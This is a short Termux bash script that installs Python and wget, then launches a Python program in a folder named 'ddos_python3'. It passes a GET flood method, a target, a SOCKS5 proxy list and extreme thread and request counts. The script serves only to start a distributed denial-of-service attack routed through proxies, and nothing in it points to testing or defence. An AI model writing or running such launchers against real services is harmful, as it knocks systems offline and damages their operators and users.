#!/data/data/com.termux/files/usr/bin/bash
cd 2> /dev/null

if [ ! -f ~/../usr/bin/python3 ]; then
  pkg update -y
  pkg upgrade -y
  pkg install wget python3 -y
fi
python3 ~/ddos_python3/start.py get khanh 1 68 socket5.txt 65500 999999999999999
exit
